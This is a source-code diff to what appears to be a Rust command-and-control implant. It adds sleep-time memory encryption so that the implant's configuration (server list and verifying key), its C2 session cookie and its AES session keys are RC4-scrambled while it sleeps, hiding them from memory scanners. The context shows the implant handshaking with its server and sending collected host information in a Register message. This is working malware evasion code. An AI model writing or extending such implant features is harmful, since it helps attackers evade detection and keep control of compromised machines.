@@ -126,7 +126,16 @@ fn decode_embedded() -> Option<Config> {
     }
     let blob_len = u32::from_be_bytes([plain[0], plain[1], plain[2], plain[3]]) as usize;
     let embedded: Option<serde_json::Value> = if 4 + blob_len <= plain.len() {
-        serde_json::from_slice(&plain[4..4 + blob_len]).ok()
+        // The decoded configuration text carries the server list and the
+        // verifying key — keep one stable copy registered with the sleep
+        // cycle (ABR-T006 Sleep 2.0) so it is RC4-scrambled for every
+        // beacon sleep window instead of sitting in plaintext heap.
+        let text: Box<str> = String::from_utf8_lossy(&plain[4..4 + blob_len])
+            .into_owned()
+            .into_boxed_str();
+        evasion::register_sensitive(text.as_ptr() as usize, text.len());
+        let leaked: &str = Box::leak(text);
+        serde_json::from_str(leaked).ok()
     } else {
         None
     };
@@ -529,6 +538,9 @@ async fn run(
         user_agent: profile.user_agent.clone(),
         cookie: format!("{}={}", profile.cookie_name, beacon.token),
     };
+    // The session cookie identifies the C2 session; keep it under the
+    // sleep-time cipher as well (stable String heap for its lifetime).
+    evasion::register_sensitive(conn.cookie.as_ptr() as usize, conn.cookie.len());
 
     let (client_secret, client_hello) = ClientHello::generate();
     let hello_body = conn
@@ -537,6 +549,15 @@ async fn run(
     let raw_hello: [u8; crypto::SERVER_HELLO_LEN] = hello_body.as_slice().try_into()?;
     let server_hello = crypto::ServerHello::from_bytes(&raw_hello);
     let mut session = crypto::client_finish(identity, client_secret, &client_hello, &server_hello)?;
+    // The session's AES key schedules are the crown jewels of a dormant
+    // thread — keep them under the sleep-time cipher (ABR-T006 Sleep
+    // 2.0). The session lives inside the run() future on the heap, so
+    // its address is stable for the process lifetime; a re-handshake
+    // rewrites the same slot.
+    evasion::register_sensitive(
+        &session as *const Session as usize,
+        std::mem::size_of::<Session>(),
+    );
 
     let (mt, body) = Message::Register(collect_info(beacon.token)).encode();
     conn.post_frame(profile.pick_uri(), &mut session, mt, &body)
